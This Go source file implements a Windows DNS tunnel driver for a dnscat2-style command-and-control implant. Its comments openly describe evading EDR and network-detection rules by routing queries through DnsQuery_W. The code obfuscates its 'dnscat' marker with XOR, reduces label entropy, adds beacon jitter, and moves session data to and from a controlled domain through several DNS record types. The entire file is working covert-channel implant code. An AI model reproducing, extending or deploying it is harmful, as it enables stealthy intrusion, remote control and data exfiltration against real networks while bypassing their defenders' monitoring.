//go:build windows

// Package dnsapi implements the DNS tunnel driver using the Windows
// DnsQuery_W API (dnsapi.dll) instead of a raw UDP socket.
//
// Behavioral difference from pkg/tunnel/dns:
//   - Raw UDP: binary opens UDP/53 socket directly → visible to EDR socket rules.
//   - DnsQuery_W: DNS Client service (svchost.exe / Dnscache) owns the UDP/53 socket;
//     the binary only makes an API call. Network-layer attribution points to svchost.
//
// Limitation: DnsQuery_W always uses the system resolver; the DNSServer field is
// stored for compatibility but not passed to the API. Domain mode (forwarder on DC)
// is the intended deployment — direct server IP mode requires the dnsapi_server.go
// variant that passes PIP4_ARRAY as pExtra.
//
// Sysmon note: Event 22 (DNSEvent) still logs the calling process PID, so this
// does NOT hide the binary from host-based telemetry. The win is against
// network-layer firewall/NDR rules that inspect socket ownership.
package dnsapi

import (
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"math/rand"
	"os"
	"sort"
	"strings"
	"time"
	"unsafe"

	"certmaint/pkg/controller"
	"certmaint/pkg/dlog"
	"golang.org/x/sys/windows"
)

// ---- Constants ---------------------------------------------------------------

const (
	MaxFieldLength = 62 // DNS RFC max label length (reference only)
	MaxLabelLength = 20 // operational label cap (entropy reduction, pass C)
	MaxDNSLength   = 255

	// DnsQuery_W option flags
	dnsQueryBypassCache = 0x00000008
	dnsQueryNoLocalName = 0x00000020
	dnsQueryNoHostsFile = 0x00000040
	dnsQueryNoNetbt     = 0x00000080
	queryOptions        = dnsQueryBypassCache | dnsQueryNoLocalName | dnsQueryNoHostsFile | dnsQueryNoNetbt

	// DnsRecordListFree free type
	dnsFreeRecordList = 1
)

// ---- WildcardPrefix (same XOR scheme as pkg/tunnel/dns) ---------------------

// WildcardPrefix is "dnscat" decoded at runtime.
var WildcardPrefix string

func init() {
	enc := []byte{0xC7, 0x90, 0x2A, 0xD7, 0x6E, 0x1E}
	b := make([]byte, len(enc))
	for i, c := range enc {
		b[i] = c ^ byte((0xA3+i*0x5B)&0xFF)
	}
	WildcardPrefix = string(b)

	// Verify struct layout matches Windows DNS_RECORD (x64) at runtime.
	// data union must start at offset 32.
	if got := unsafe.Offsetof((*dnsRecord)(nil).data); got != 32 {
		panic(fmt.Sprintf("dnsapi: dnsRecord.data offset = %d, want 32 — struct layout mismatch", got))
	}
}

// ---- Windows API bindings ----------------------------------------------------

var (
	dnsapiDLL    = windows.NewLazySystemDLL("dnsapi.dll")
	procDnsQuery = dnsapiDLL.NewProc("DnsQuery_W")
	procDnsFree  = dnsapiDLL.NewProc("DnsRecordListFree")
)

// dnsRecord mirrors the fixed header of the Windows DNS_RECORD struct on x64.
//
// x64 layout (verified by init()):
//
//	+0   pNext       *dnsRecord  (8 bytes)
//	+8   pName       *uint16     (8 bytes, PWSTR)
//	+16  wType       uint16
//	+18  wDataLength uint16
//	+20  flags       uint32
//	+24  dwTtl       uint32
//	+28  dwReserved  uint32
//	+32  data        [512]byte   (Data union, type-specific — see parse* functions)
type dnsRecord struct {
	pNext       *dnsRecord
	pName       *uint16
	wType       uint16
	wDataLength uint16
	flags       uint32
	dwTtl       uint32
	dwReserved  uint32
	data        [512]byte
}

// ---- DNS type constants ------------------------------------------------------

// DNSType represents DNS record types
type DNSType uint16

const (
	TypeA     DNSType = 1
	TypeCNAME DNSType = 5
	TypeMX    DNSType = 15
	TypeTXT   DNSType = 16
	TypeAAAA  DNSType = 28
)

// ---- Driver ------------------------------------------------------------------

// Driver implements the DNS tunnel via DnsQuery_W.
type Driver struct {
	Domain    string
	DNSServer string // stored for API compatibility; not passed to DnsQuery_W
	DNSPort   uint16 // stored for API compatibility; not used
	Types     []DNSType
	nextSend  time.Time
}

// NewDriver creates a new DNS API driver.
// Signature matches dns.NewDriver so cmd/main.go can swap the import.
func NewDriver(domain, host string, port uint16, types string, server string) (*Driver, error) {
	if err := dnsapiDLL.Load(); err != nil {
		return nil, fmt.Errorf("dnsapi.dll not available: %w", err)
	}

	d := &Driver{
		Domain:    domain,
		DNSServer: server,
		DNSPort:   port,
	}

	if types == "ANY" {
		types = "TXT,CNAME,MX"
	}

	for _, t := range strings.Split(types, ",") {
		t = strings.TrimSpace(strings.ToUpper(t))
		switch t {
		case "TXT", "TEXT":
			d.Types = append(d.Types, TypeTXT)
		case "MX":
			d.Types = append(d.Types, TypeMX)
		case "CNAME":
			d.Types = append(d.Types, TypeCNAME)
		case "A":
			d.Types = append(d.Types, TypeA)
		case "AAAA":
			d.Types = append(d.Types, TypeAAAA)
		}
	}

	if len(d.Types) == 0 {
		return nil, fmt.Errorf("no valid DNS types specified")
	}

	return d, nil
}

// MaxDNSCatLength returns the maximum dnscat2 payload length per query.
func (d *Driver) MaxDNSCatLength() int {
	domainLen := len(d.Domain)
	if d.Domain == "" {
		domainLen = len(WildcardPrefix)
	}
	return (MaxDNSLength / 2) - domainLen - 1 - ((MaxDNSLength / MaxLabelLength) + 1)
}

func (d *Driver) getType() DNSType {
	return d.Types[rand.Intn(len(d.Types))]
}

// encodeDNSName encodes dnscat2 data as a DNS query name (same as dns package).
func (d *Driver) encodeDNSName(data []byte) string {
	var result strings.Builder

	if d.Domain == "" {
		result.WriteString(WildcardPrefix)
		result.WriteByte('.')
	}

	encoded := hex.EncodeToString(data)
	sectionLen := 0

	for i := 0; i < len(encoded); i++ {
		result.WriteByte(encoded[i])
		sectionLen++
		if i+1 != len(encoded) && sectionLen+1 >= MaxLabelLength {
			result.WriteByte('.')
			sectionLen = 0
		}
	}

	if d.Domain != "" {
		result.WriteByte('.')
		result.WriteString(d.Domain)
	}

	return result.String()
}

// ---- DnsQuery_W call ---------------------------------------------------------

// dnsQuery sends name/qtype via DnsQuery_W and returns the decoded dnscat2 payload.
func (d *Driver) dnsQuery(name string, qtype DNSType) ([]byte, error) {
	nameW, err := windows.UTF16PtrFromString(name)
	if err != nil {
		return nil, fmt.Errorf("UTF16PtrFromString: %w", err)
	}

	var results *dnsRecord
	ret, _, _ := procDnsQuery.Call(
		uintptr(unsafe.Pointer(nameW)),
		uintptr(qtype),
		uintptr(queryOptions),
		0,
		uintptr(unsafe.Pointer(&results)),
		0,
	)

	if ret != 0 {
		return nil, fmt.Errorf("DnsQuery_W: 0x%08x", ret)
	}

	if results == nil {
		return nil, fmt.Errorf("DnsQuery_W: nil result")
	}

	defer procDnsFree.Call(uintptr(unsafe.Pointer(results)), dnsFreeRecordList)

	return d.parseRecords(results, qtype)
}

// ---- Response parsing --------------------------------------------------------

// parseRecords extracts the dnscat2 payload from the DNS_RECORD linked list.
func (d *Driver) parseRecords(head *dnsRecord, qtype DNSType) ([]byte, error) {
	switch qtype {
	case TypeTXT:
		for r := head; r != nil; r = r.pNext {
			if r.wType == uint16(TypeTXT) {
				return d.parseTXTRecord(r)
			}
		}
	case TypeCNAME:
		for r := head; r != nil; r = r.pNext {
			if r.wType == uint16(TypeCNAME) {
				return d.parsePTRRecord(r)
			}
		}
	case TypeMX:
		for r := head; r != nil; r = r.pNext {
			if r.wType == uint16(TypeMX) {
				return d.parseMXRecord(r)
			}
		}
	case TypeA:
		var aRecs []*dnsRecord
		for r := head; r != nil; r = r.pNext {
			if r.wType == uint16(TypeA) {
				aRecs = append(aRecs, r)
			}
		}
		return d.parseARecords(aRecs)
	case TypeAAAA:
		var aRecs []*dnsRecord
		for r := head; r != nil; r = r.pNext {
			if r.wType == uint16(TypeAAAA) {
				aRecs = append(aRecs, r)
			}
		}
		return d.parseAAAARecords(aRecs)
	}
	return nil, fmt.Errorf("no matching record for type %d", qtype)
}

// parseTXTRecord reads the payload from a TXT record.
//
// DNS_TXT_DATA layout (x64):
//
//	data[0:4]  = dwStringCount (DWORD)
//	data[4:8]  = padding (compiler-inserted for 8-byte pointer alignment)
//	data[8:16] = pStringArray[0] (*uint16, PWSTR)
func (d *Driver) parseTXTRecord(r *dnsRecord) ([]byte, error) {
	ptrVal := binary.LittleEndian.Uint64(r.data[8:16])
	if ptrVal == 0 {
		return nil, fmt.Errorf("TXT: null string pointer")
	}
	str := windows.UTF16PtrToString((*uint16)(unsafe.Pointer(uintptr(ptrVal))))
	return d.decodeHex([]byte(str))
}

// parsePTRRecord handles CNAME records (DNS_PTR_DATA).
//
// DNS_PTR_DATA layout (x64):
//
//	data[0:8] = pNameHost (*uint16, PWSTR)
func (d *Driver) parsePTRRecord(r *dnsRecord) ([]byte, error) {
	ptrVal := binary.LittleEndian.Uint64(r.data[0:8])
	if ptrVal == 0 {
		return nil, fmt.Errorf("CNAME: null pointer")
	}
	name := windows.UTF16PtrToString((*uint16)(unsafe.Pointer(uintptr(ptrVal))))
	name = d.removeDomain(name)
	if name == "" {
		return nil, fmt.Errorf("CNAME: empty after stripping domain")
	}
	return d.decodeHex([]byte(name))
}

// parseMXRecord handles MX records (DNS_MX_DATA).
//
// DNS_MX_DATA layout (x64):
//
//	data[0:8] = pNameExchange (*uint16, PWSTR)
//	data[8:10] = wPreference (WORD)
func (d *Driver) parseMXRecord(r *dnsRecord) ([]byte, error) {
	ptrVal := binary.LittleEndian.Uint64(r.data[0:8])
	if ptrVal == 0 {
		return nil, fmt.Errorf("MX: null pointer")
	}
	name := windows.UTF16PtrToString((*uint16)(unsafe.Pointer(uintptr(ptrVal))))
	name = d.removeDomain(name)
	if name == "" {
		return nil, fmt.Errorf("MX: empty after stripping domain")
	}
	return d.decodeHex([]byte(name))
}

// parseARecords reassembles the payload from multiple A records.
// data[0] = sequence byte; data[1:4] = payload (3 bytes per record).
func (d *Driver) parseARecords(recs []*dnsRecord) ([]byte, error) {
	if len(recs) == 0 {
		return nil, fmt.Errorf("no A records")
	}

	sort.Slice(recs, func(i, j int) bool {
		return recs[i].data[0] < recs[j].data[0]
	})

	var buf []byte
	for _, r := range recs {
		buf = append(buf, r.data[1], r.data[2], r.data[3])
	}

	if len(buf) < 1 {
		return nil, fmt.Errorf("A record payload too short")
	}
	length := int(buf[0])
	if length > len(buf)-1 {
		return nil, fmt.Errorf("A record length mismatch: want %d, have %d", length, len(buf)-1)
	}
	return buf[1 : length+1], nil
}

// parseAAAARecords handles AAAA records (15 bytes payload per record).
func (d *Driver) parseAAAARecords(recs []*dnsRecord) ([]byte, error) {
	if len(recs) == 0 {
		return nil, fmt.Errorf("no AAAA records")
	}

	sort.Slice(recs, func(i, j int) bool {
		return recs[i].data[0] < recs[j].data[0]
	})

	var buf []byte
	for _, r := range recs {
		buf = append(buf, r.data[1:16]...)
	}

	if len(buf) < 1 {
		return nil, fmt.Errorf("AAAA record payload too short")
	}
	length := int(buf[0])
	if length > len(buf)-1 {
		return nil, fmt.Errorf("AAAA record length mismatch")
	}
	return buf[1 : length+1], nil
}

// ---- Helpers -----------------------------------------------------------------

func (d *Driver) removeDomain(name string) string {
	if d.Domain != "" {
		if !strings.HasSuffix(name, d.Domain) {
			return ""
		}
		if name == d.Domain {
			return ""
		}
		return strings.TrimSuffix(name, "."+d.Domain)
	}
	if !strings.HasPrefix(name, WildcardPrefix) {
		return ""
	}
	return strings.TrimPrefix(name, WildcardPrefix+".")
}

func (d *Driver) decodeHex(data []byte) ([]byte, error) {
	clean := strings.ReplaceAll(string(data), ".", "")
	return hex.DecodeString(clean)
}

// scheduleNext sets the next send time with jitter (same semantics as dns package).
//
//	active=true:  1000 + rand(0..2000) ms  (real app data was queued)
//	active=false: 5 + rand(0..25) s        (idle — only keep-alive sent)
func (d *Driver) scheduleNext(active bool) {
	var jitter time.Duration
	if active {
		jitter = time.Duration(1000+rand.Intn(2000)) * time.Millisecond
	} else {
		jitter = time.Duration(5+rand.Intn(25)) * time.Second
	}
	d.nextSend = time.Now().Add(jitter)
}

// ---- Run loop ----------------------------------------------------------------

// Run starts the DNS API driver main loop.
//
// Unlike pkg/tunnel/dns which separates send (UDP write) from receive (UDP read
// with deadline), DnsQuery_W is synchronous: one call sends the query and blocks
// until the response arrives. The loop therefore has no separate read path.
func (d *Driver) Run() {
	// Trigger the initial exchange immediately.
	d.nextSend = time.Now()

	for {
		controller.Heartbeat()

		// Sleep in 50 ms increments until the jitter gate opens,
		// so Heartbeat() runs regularly while waiting.
		if waitLeft := time.Until(d.nextSend); waitLeft > 0 {
			sleep := waitLeft
			if sleep > 50*time.Millisecond {
				sleep = 50 * time.Millisecond
			}
			time.Sleep(sleep)
			continue
		}

		// Check for real application data BEFORE GetOutgoing so we can
		// distinguish a keep-alive send (idle) from a data send (active).
		hasData := controller.HasPendingData()

		data, hasActive := controller.GetOutgoing(d.MaxDNSCatLength())
		if !hasActive {
			dlog.Println("No active sessions.")
			os.Exit(0)
		}

		if data == nil {
			// canTransmitYet() was false — PacketDelay not yet elapsed.
			// Don't reschedule; retry on next 50 ms tick.
			continue
		}

		if len(data) == 0 {
			// Shouldn't happen in StateEstablished (session always packs a MSG),
			// but guard anyway to avoid sending an empty query.
			d.scheduleNext(false)
			continue
		}

		qtype := d.getType()
		name := d.encodeDNSName(data)

		resp, err := d.dnsQuery(name, qtype)
		sent := err == nil
		// active interval only when real app data was queued AND packet went out
		d.scheduleNext(sent && hasData)

		if err != nil {
			dlog.Printf("DNSAPI: query error: %v\n", err)
			continue
		}

		if len(resp) > 0 && controller.DataIncoming(resp) {
			// Server signalled it has more data for us — respond immediately.
			d.nextSend = time.Now()
		}
	}
}

// Close is a no-op: DnsQuery_W uses no persistent socket.
func (d *Driver) Close() {}
